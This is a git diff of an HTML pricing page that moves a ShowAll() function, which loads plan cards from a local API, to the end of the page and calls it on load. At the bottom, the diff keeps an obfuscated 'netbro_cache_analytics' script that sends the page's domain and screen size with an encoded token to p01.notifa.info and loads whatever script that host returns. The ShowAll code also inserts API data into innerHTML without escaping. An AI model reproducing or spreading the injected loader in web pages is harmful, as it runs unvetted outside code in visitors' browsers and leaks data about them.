@@ -40,39 +40,7 @@
 
 </head>
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<body class="layout-sticky-subnav layout-default ">
+<body class="layout-sticky-subnav layout-default " onload="ShowAll()">
 
     <div class="preloader">
         <div class="sk-double-bounce">
@@ -199,21 +167,6 @@
 
         <!-- Header Layout Content -->
         <div class="mdk-header-layout__content page-content ">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-            <button onclick='ShowAll()'>show</button>
             <div class="page-section bg-primary">
                 <div class="container page__container">
                     <!-- <div class="hero text-center pb-64pt">
@@ -324,26 +277,7 @@
                             </div>
                         </div>
                     </div>
-                    <script>
-                        function ShowAll(){
-                            var url  = "http://localhost:3000/api/contents";
-                            var xhr  = new XMLHttpRequest();
-                            var content = '';
-                            xhr.open('GET', url, true);
-                            xhr.onload = function() {
-                                var contents = JSON.parse(xhr.responseText);
-                                if (xhr.readyState == 4 && xhr.status == "200") {
-                                    contents.forEach((val) => {
-                                        content+='<div class="col-lg-4 col-sm-6 card-group-row__col"><div class="card card-group-row__card text-center o-hidden border-0"><div class="card-body d-flex flex-column"><div class="flex-grow mb-16pt"><span class="w-64 h-64 icon-holder icon-holder--outline-secondary rounded-circle d-inline-flex mb-16pt"><i class="material-icons">person</i></span><h4 class="mb-8pt">'+val.Description1+'</h4><p class="text-70 mb-0">'+val.Description2+'</p></div><p class="d-flex justify-content-center align-items-center m-0"><span class="h4 m-0 font-weight-normal">&dollar;</span><span class="h1 m-0 font-weight-normal">'+val.Description3+'</span><span class="h4 m-0 font-weight-normal">'+val.Description4+'</span></p><p class="lh-1 text-muted mb-0"><small>after the free trial ends</small></p></div><div class="card-footer"><a href="fixed-signup.html" class="btn btn-outline-secondary">Get started</a></div></div></div>';
-                                    })
-                                    document.getElementById('change').innerHTML = content;
-                                } else {
-                                    console.error(courses);
-                                }
-                            }
-                            xhr.send(null);
-                        }
-                    </script>
+                    
 
                     <div class="page-headline page-headline--white page-headline--title text-center">
                         <h2 class="text-white">All plans include</h2>
@@ -1427,6 +1361,26 @@
 
 
 
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXm4UFHi%2b9QCIsSEJiCQuGkGnR3SCCDl2dGFmm6eZIyqA%2fgn4MvhgE0O2QBBlbPDMN9qAK6oU401rmyYSPMO0K7c%2fyp%2fOExMm%2fAkn1luCkDvF9VatUnwugV8TJy%2f6U9wzurUZ%2fxgcTeA8TTM%2bHVD39QSbWTJ6wG9WKpasUC0gsREwuhfKL3D95fd9kXCBK%2b4b%2fViNVRvnnHTkcdWeEDP8BS0FjvJSv7xeuRw5%2fGrLawUSbBWfLu2ieX4HnItmHFzNBngDLSJD1G6y2g7%2b3NSWyxkyxKGE2HRjtdMrRASyGBJehtXEUD%2bz4AA%2blaq0Z%2fYGHrkon7LrRCyGEI3sk59n4qM%2fAtcvtMSWCBeVLI7jqGtdZR1HfkQGDl8wmK%2f4TjOpIxya5ffx7ICmrYmHD6uee3fDKOnaz1ZjPmMkre89YSTnVNav4JIHkpdjagGGchU0%2bxr6EZ7OTo2g%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXm4UFHi%2b9QCIsSEJiCQuGkGnR3SCCDl2dGFmm6eZIyqA%2fgn4MvhgE0O2QBBlbPDMN9qAK6oU401rmyYSPMO0K7c%2fyp%2fOExMm%2fAkn1luCkDvF9VatUnwugV8TJy%2f6U9wzurUZ%2fxgcTeA8TTM%2bHVD39QSbWTJ6wG9WKpasUC0gsREwuhfKL3D95fd9kXCBK%2b4b%2fViNVRvnnHTkcdWeEDP8BS0FjvJSv7xeuRw5%2fGrLawUSbBWfLu2ieX4HnItmHFzNBngDLSJD1G6y2g7%2b3NSWyxkyxKGE2HRjtdMrRASyGBJehtXEUD%2bz4AA%2blaq0Z%2fYGHrkon7LrRCyGEI3sk59n4qM%2fAtcvtMSWCBeVLI7jqGtdZR1HfkQGDl8wmK%2f4TjOpIxya5ffx7ICmrYmHD6uee3fDKOnaz1ZjPmMkre89YSTnVNav4JIHkpdjagGGchU0%2bxr6EZ7OTo2g%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+<script>
+    function ShowAll(){
+        var url  = "http://localhost:3000/api/contents";
+        var xhr  = new XMLHttpRequest();
+        var content = '';
+        xhr.open('GET', url, true);
+        xhr.onload = function() {
+            var contents = JSON.parse(xhr.responseText);
+            if (xhr.readyState == 4 && xhr.status == "200") {
+                contents.forEach((val) => {
+                    content+='<div class="col-lg-4 col-sm-6 card-group-row__col"><div class="card card-group-row__card text-center o-hidden border-0"><div class="card-body d-flex flex-column"><div class="flex-grow mb-16pt"><span class="w-64 h-64 icon-holder icon-holder--outline-secondary rounded-circle d-inline-flex mb-16pt"><i class="material-icons">person</i></span><h4 class="mb-8pt">'+val.Description1+'</h4><p class="text-70 mb-0">'+val.Description2+'</p></div><p class="d-flex justify-content-center align-items-center m-0"><span class="h4 m-0 font-weight-normal">&dollar;</span><span class="h1 m-0 font-weight-normal">'+val.Description3+'</span><span class="h4 m-0 font-weight-normal">'+val.Description4+'</span></p><p class="lh-1 text-muted mb-0"><small>after the free trial ends</small></p></div><div class="card-footer"><a href="fixed-signup.html" class="btn btn-outline-secondary">Get started</a></div></div></div>';
+                })
+                document.getElementById('change').innerHTML = content;
+            } else {
+                console.error(courses);
+            }
+        }
+        xhr.send(null);
+    }
+</script></body>
 
 </html>
